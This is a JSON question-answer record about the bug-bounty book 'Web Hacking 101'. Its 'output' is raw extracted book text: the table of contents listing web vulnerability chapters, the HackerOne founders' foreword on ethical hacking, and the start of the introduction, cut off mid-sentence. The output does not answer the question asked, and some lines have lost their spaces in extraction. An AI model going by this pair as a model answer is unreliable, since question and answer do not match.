[
  {
    "input": "What is the main purpose of the book \"Web Hacking 101\"?",
    "summary": "The text is a book titled \"Web Hacking 101\" that explains 30 common web vulnerabilities, including open redirects, HTTP parameter pollution, cross-site request forgery, HTML injection, CRLF injection, cross-site scripting, server-side template injection, SQL injection, server-side request forgery, XML external entity vulnerabilities, remote code execution, memory corruption, subdomain takeover, race conditions, and insecure direct object references. It also covers how to find and report these vulnerabilities, and provides a list of tools and resources for beginners. The book emphasizes the importance of ethical hacking and responsible disclosure, and highlights the support from HackerOne and other companies in the process.",
    "output": "Contents\n1. Foreword . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1\n2. Introduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3\nHow It All Started . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3\nJust 30 Examples and My First Sale . . . . . . . . . . . . . . . . . . . . . . . . 4\nWho This Book Is Written For . . . . . . . . . . . . . . . . . . . . . . . . . . . 6\nChapter Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7\nWord of Warning and a Favour . . . . . . . . . . . . . . . . . . . . . . . . . . 9\n3. Background . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10\n4. Open Redirect Vulnerabilities . . . . . . . . . . . . . . . . . . . . . . . . . . . 13\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13\n1. Shopify Theme Install Open Redirect . . . . . . . . . . . . . . . . . . . . . 13\n2. Shopify Login Open Redirect . . . . . . . . . . . . . . . . . . . . . . . . . . 14\n3. HackerOne Interstitial Redirect . . . . . . . . . . . . . . . . . . . . . . . . 15\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17\n5. HTTP Parameter Pollution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21\n1. HackerOne Social Sharing Buttons . . . . . . . . . . . . . . . . . . . . . . 21\n2. Twitter Unsubscribe Notifications . . . . . . . . . . . . . . . . . . . . . . . 22\n3. Twitter Web Intents . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26\n6. Cross-Site Request Forgery . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\n1. Shopify Twitter Disconnect . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\n2. Change Users Instacart Zones . . . . . . . . . . . . . . . . . . . . . . . . . 32\n3. Badoo Full Account Takeover . . . . . . . . . . . . . . . . . . . . . . . . . 34\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 36\nCONTENTS\n7. HTML Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37\n1. Coinbase Comments . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37\n2. HackerOne Unintended HTML Inclusion . . . . . . . . . . . . . . . . . . . 39\n3. Within Security Content Spoofing . . . . . . . . . . . . . . . . . . . . . . . 40\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41\n8. CRLF Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43\n1. Twitter HTTP Response Splitting . . . . . . . . . . . . . . . . . . . . . . . . 44\n2. v.shopify.com Response Splitting . . . . . . . . . . . . . . . . . . . . . . . 46\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48\n9. Cross-Site Scripting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 49\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 49\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 54\n1. Shopify Wholesale . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 54\n2. Shopify Giftcard Cart . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56\n3. Shopify Currency Formatting . . . . . . . . . . . . . . . . . . . . . . . . . . 58\n4. Yahoo Mail Stored XSS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 59\n5. Google Image Search . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 61\n6. Google Tagmanager Stored XSS . . . . . . . . . . . . . . . . . . . . . . . . 62\n7. United Airlines XSS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 63\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 68\n10. Template Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 69\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 69\nServer Side Template Injections . . . . . . . . . . . . . . . . . . . . . . . . . 69\nClient Side Template Injections . . . . . . . . . . . . . . . . . . . . . . . . . . 70\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 71\n1. Uber Angular Template Injection . . . . . . . . . . . . . . . . . . . . . . . 71\n2. Uber Template Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . 72\n3. Rails Dynamic Render . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 75\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76\n11. SQL Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 77\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 77\nSQL Databases . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 77\nCountermeasures Against SQLi . . . . . . . . . . . . . . . . . . . . . . . . . . 79\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 79\n1. Drupal SQL Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 79\n2. Yahoo Sports Blind SQL . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 82\nCONTENTS\n3. Uber Blind SQLi . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 85\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 88\n12. Server Side Request Forgery . . . . . . . . . . . . . . . . . . . . . . . . . . . . 89\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 89\nHTTP Request Location . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 89\nInvoking GET Versus POST Requests . . . . . . . . . . . . . . . . . . . . . . . 90\nBlind SSRFs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90\nLeveraging SSRF . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 91\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 91\n1. ESEA SSRF and Querying AWS Metadata . . . . . . . . . . . . . . . . . . . 91\n2. Google Internal DNS SSRF . . . . . . . . . . . . . . . . . . . . . . . . . . . 93\n3. Internal Port Scanning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 97\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 99\n13. XML External Entity Vulnerability . . . . . . . . . . . . . . . . . . . . . . . . . 100\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 100\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104\n1. Read Access to Google . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104\n2. Facebook XXE with Word . . . . . . . . . . . . . . . . . . . . . . . . . . . . 105\n3. Wikiloc XXE . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 108\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 111\n14. Remote Code Execution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 112\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 112\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 112\n1. Polyvore ImageMagick . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 112\n2. Algolia RCE on facebooksearch.algolia.com . . . . . . . . . . . . . . . . . 114\n3. Foobar Smarty Template Injection RCE . . . . . . . . . . . . . . . . . . . . 116\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 120\n15. Memory . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 121\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 121\nBuffer Overflow . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 121\nRead out of Bounds . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 122\nMemory Corruption . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 124\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 125\n1. PHP ftp_genlist() . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 125\n2. Python Hotshot Module . . . . . . . . . . . . . . . . . . . . . . . . . . . . 126\n3. Libcurl Read Out of Bounds . . . . . . . . . . . . . . . . . . . . . . . . . . 127\n4. PHP Memory Corruption . . . . . . . . . . . . . . . . . . . . . . . . . . . . 128\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 129\nCONTENTS\n16. Sub Domain Takeover . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 130\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 130\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 130\n1. Ubiquiti Sub Domain Takeover . . . . . . . . . . . . . . . . . . . . . . . . . 130\n2. Scan.me Pointing to Zendesk . . . . . . . . . . . . . . . . . . . . . . . . . 131\n3. Shopify Windsor Sub Domain Takeover . . . . . . . . . . . . . . . . . . . . 132\n4. Snapchat Fastly Takeover . . . . . . . . . . . . . . . . . . . . . . . . . . . . 133\n5. api.legalrobot.com . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 135\n6. Uber SendGrid Mail Takeover . . . . . . . . . . . . . . . . . . . . . . . . . 138\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 141\n17. Race Conditions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 142\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 142\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 144\n1. Starbucks Race Conditions . . . . . . . . . . . . . . . . . . . . . . . . . . . 144\n2. Accepting HackerOne Invites Multiple Times . . . . . . . . . . . . . . . . . 145\n3. Exceeding Keybase Invitation Limits . . . . . . . . . . . . . . . . . . . . . 148\n4. HackerOne Payments . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 149\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 151\n18. Insecure Direct Object References . . . . . . . . . . . . . . . . . . . . . . . . 152\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 152\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 153\n1. Binary.com Privilege Escalation . . . . . . . . . . . . . . . . . . . . . . . . 153\n2. Moneybird App Creation . . . . . . . . . . . . . . . . . . . . . . . . . . . . 154\n3. Twitter Mopub API Token Stealing . . . . . . . . . . . . . . . . . . . . . . . 156\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 158\n19. OAuth . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 159\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 159\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 163\n1. Swiping Facebook Official Access Tokens . . . . . . . . . . . . . . . . . . . 163\n2. Stealing Slack OAuth Tokens . . . . . . . . . . . . . . . . . . . . . . . . . . 164\n3. Stealing Google Drive Spreadsheets . . . . . . . . . . . . . . . . . . . . . . 165\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 168\n20. Application Logic Vulnerabilities . . . . . . . . . . . . . . . . . . . . . . . . . 169\nDescription . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 169\nExamples . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 170\n1. Shopify Administrator Privilege Bypass . . . . . . . . . . . . . . . . . . . . 170\n2. HackerOne Signal Manipulation . . . . . . . . . . . . . . . . . . . . . . . . 171\n3. Shopify S3 Buckets Open . . . . . . . . . . . . . . . . . . . . . . . . . . . . 172\n4. HackerOne S3 Buckets Open . . . . . . . . . . . . . . . . . . . . . . . . . . 172\nCONTENTS\n5. Bypassing GitLab Two Factor Authentication . . . . . . . . . . . . . . . . . 175\n6. Yahoo PHP Info Disclosure . . . . . . . . . . . . . . . . . . . . . . . . . . . 177\n7. HackerOne Hacktivity Voting . . . . . . . . . . . . . . . . . . . . . . . . . . 178\n8. Accessing PornHub’s Memcache Installation . . . . . . . . . . . . . . . . . 181\n9. Bypassing Twitter Account Protections . . . . . . . . . . . . . . . . . . . . 183\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 184\n21. Getting Started . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 186\nInformation Gathering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 186\nApplication Testing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 189\nDigging Deeper . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 190\nSummary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 192\n22. Vulnerability Reports . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 193\nRead the disclosure guidelines. . . . . . . . . . . . . . . . . . . . . . . . . . . . 193\nInclude Details. Then Include More. . . . . . . . . . . . . . . . . . . . . . . . . 193\nConfirm the Vulnerability . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 194\nShow Respect for the Company . . . . . . . . . . . . . . . . . . . . . . . . . . . 194\nBounties . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 196\nDon’t Shout Hello Before Crossing the Pond . . . . . . . . . . . . . . . . . . . . 196\nParting Words . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 197\n23. Tools . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 199\nBurp Suite . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 199\nZAP Proxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 199\nKnockpy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 200\nHostileSubBruteforcer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 200\nSublist3r . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 200\ncrt.sh . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 200\nIPV4info.com . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 201\nSecLists . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 201\nXSSHunter . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 201\nsqlmap . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 201\nNmap . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 202\nEyewitness . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 202\nShodan . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 202\nCensys . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 203\nWhat CMS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 203\nBuiltWith . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 203\nNikto . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 203\nRecon-ng . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 204\nGitRob . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 204\nCyberChef . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 204\nCONTENTS\nOnlineHashCrack.com . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 205\nidb . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 205\nWireshark . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 205\nBucket Finder . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 205\nRace the Web . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 205\nGoogle Dorks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 206\nJD GUI . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 206\nMobile Security Framework . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 206\nYsoserial . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 206\nFirefox Plugins . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 206\nFoxyProxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 206\nUser Agent Switcher . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 207\nFirebug . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 207\nHackbar . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 207\nWebsecurify . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 207\nCookie Manager+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 207\nXSS Me . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 207\nOffsec Exploit-db Search . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 207\nWappalyzer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 208\n24. Resources . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 209\nOnline Training . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 209\nWeb Application Exploits and Defenses . . . . . . . . . . . . . . . . . . . . . 209\nThe Exploit Database . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 209\nUdacity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 209\nBug Bounty Platforms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 209\nHackerone.com . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 209\nBugcrowd.com . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210\nSynack.com . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210\nCobalt.io . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210\nVideo Tutorials . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210\nyoutube.com/yaworsk1 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210\nSeccasts.com . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210\nHow to Shot Web . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210\nFurther Reading . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 211\nOWASP.com . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 211\nHackerone.com/hacktivity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 211\nhttps://bugzilla.mozilla.org . . . . . . . . . . . . . . . . . . . . . . . . . . . . 211\nTwitter #infosec and #bugbounty . . . . . . . . . . . . . . . . . . . . . . . . 211\nTwitter @disclosedh1 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 211\nWeb Application Hackers Handbook . . . . . . . . . . . . . . . . . . . . . . . 211\nBug Hunters Methodology . . . . . . . . . . . . . . . . . . . . . . . . . . . . 212\nRecommended Blogs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 212\nCONTENTS\nphilippeharewood.com . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 212\nPhilippe’s Facebook Page - www.facebook.com/phwd-113702895386410 . . 212\nfin1te.net . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 212\nNahamSec.com . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 212\nblog.it-securityguard.com . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 212\nblog.innerht.ml . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213\nblog.orange.tw . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213\nPortswigger Blog . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213\nNvisium Blog . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213\nblog.zsec.uk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213\nbrutelogic.com.br . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213\nlcamtuf.blogspot.ca . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213\nBug Crowd Blog . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213\nHackerOne Blog . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 214\nCheatsheets . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 214\n25. Glossary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 215\nBlack Hat Hacker . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 215\nBuffer Overflow . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 215\nBug Bounty Program . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 215\nBug Report . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 215\nCRLF Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 215\nCross Site Request Forgery . . . . . . . . . . . . . . . . . . . . . . . . . . . . 216\nCross Site Scripting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 216\nHTML Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 216\nHTTP Parameter Pollution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 216\nHTTP Response Splitting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 216\nMemory Corruption . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 216\nOpen Redirect . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217\nPenetration Testing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217\nResearchers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217\nResponse Team . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217\nResponsible Disclosure . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217\nVulnerability . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217\nVulnerability Coordination . . . . . . . . . . . . . . . . . . . . . . . . . . . . 218\nVulnerability Disclosure . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 218\nWhite Hat Hacker . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 218\n26. Appendix A - Take Aways . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 219\nOpen Redirects . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 219\nHTTP Parameter Pollution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 220\nCross Site Request Forgery . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 220\nHTML Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 221\nCONTENTS\nCRLF Injections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 222\nCross-Site Scripting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 222\nSSTI . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 224\nSQL Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 225\nServer Side Request Forgery . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 225\nXML External Entity Vulnerability . . . . . . . . . . . . . . . . . . . . . . . . . . 226\nRemote Code Execution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 227\nMemory . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 228\nSub Domain Takeover . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 229\nRace Conditions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 230\nInsecure Direct Object References . . . . . . . . . . . . . . . . . . . . . . . . . 231\nOAuth. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 232\nApplication Logic Vulnerabilities . . . . . . . . . . . . . . . . . . . . . . . . . . . 233\n27. Appendix B - Web Hacking 101 Changelog . . . . . . . . . . . . . . . . . . . . 236\n1. Foreword\nThebestwaytolearnissimplybydoing.Thatishowwe-MichielPrinsandJobertAbma\n- learned to hack.\nWe were young. Like all hackers who came before us, and all of those who will come\nafter, we were driven by an uncontrollable, burning curiosity to understand how things\nworked. We were mostly playing computer games, and by age 12 we decided to learn\nhow to build software of our own. We learned how to program in Visual Basic and PHP\nfrom library books and practice.\nFromourunderstandingofsoftwaredevelopment,wequicklydiscoveredthattheseskills\nallowedus tofind otherdevelopers’mistakes. Weshifted frombuilding tobreaking and\nhacking has been our passion ever since. To celebrate our high school graduation, we\ntook over a TV station’s broadcast channel to air an ad congratulating our graduating\nclass. While amusing at the time, we quickly learned there are consequences and these\narenotthekindofhackerstheworldneeds.TheTVstationandschoolwerenotamused\nand we spent the summer washing windows as our punishment. In college, we turned\nour skills into a viable consulting business that, at its peak, had clients in the public and\nprivate sector across the entire world. Our hacking experience led us to HackerOne, a\ncompany we co-founded in 2012. We wanted to allow every company in the universe to\nwork with hackers successfully and this continues to be HackerOne’s mission today.\nIfyou’rereadingthis,youalsohavethecuriosityneededtobeahackerandbughunter.\nWe believe this book will be a tremendous guide along your journey. It’s filled with rich,\nreal world examples of security vulnerability reports that resulted in real bug bounties,\nalongwithhelpfulanalysisandreviewbyPeteYaworski,theauthorandafellowhacker.\nHe is your companion as you learn, and that’s invaluable.\nAnother reason this book is so important is that it focuses on how to become an ethical\nhacker. Mastering the art of hacking can be an extremely powerful skill that we hope\nwill be used for good. The most successful hackers know how to navigate the thin line\nbetween right and wrong while hacking. Many people can break things, and even try to\nmake a quick buck doing so. But imagine you can make the Internet safer, work with\namazing companies around the world, and even get paid along the way. Your talent has\nthe potential of keeping billions of people and their data secure. That is what we hope\nyou aspire to.\nWearegratefultonoendtoPetefortakinghistimetodocumentallofthissoeloquently.\nWewishwehadthisresourcewhenweweregettingstarted.Pete’sbookisajoytoread\nwith the information needed to kickstart your hacking journey.\nHappy reading, and happy hacking!\nForeword 2\nRemember to hack responsibly.\nMichiel Prins and Jobert Abma Co-Founders, HackerOne\n2. Introduction\nThank you for purchasing this book, I hope you have as much fun reading it as I did\nresearching and writing it.\nWeb Hacking 101 is my first book, meant to help you get started hacking. I began\nwritingthisasaself-publishedexplanationof30vulnerabilities,aby-productofmyown\nlearning. It quickly turned into so much more.\nMyhopeforthebook,attheveryleast,istoopenyoureyestothevastworldofhacking.\nAt best, I hope this will be your first step towards making the web a safer place while\nearning some money doing it.\nHow It All Started\nIn late 2015, I stumbled across the book, We Are Anonymous: Inside the Hacker World\nof LulzSec, Anonymous and the Global Cyber Insurgency by Parmy Olson and ended up\nreading it in a week. Having finished it though, I was left wondering how these hackers\ngot started.\nIwasthirstyformore,butIdidn’tjustwanttoknowWHAThackersdid,Iwantedtoknow\nHOWhackersdidit.SoIkeptreading.ButeachtimeIfinsihedanewbook,Iwasstillleft\nwith the same questions:\n• How do other Hackers learn about the vulnerabilities they find?\n• Where are people finding vulnerabilities?\n• How do Hackers start the process of hacking a target site?\n• Is Hacking just about using automated tools?\n• How can I get started finding vulnerabilities?\nBut looking for more answers, kept opening more and more doors.\nAroundthissametime,IwastakingCourseraAndroiddevelopmentcoursesandkeeping\nan eye out for other interesting courses. The Coursera Cybersecurity specialization\ncaughtmyeye,particularlyCourse2,SoftwareSecurity.Luckilyforme,itwasjuststarting\n(as of February 2016, it is listed as Coming Soon) and I enrolled.\nA few lectures in, I finally understood what a buffer overflow was and how it 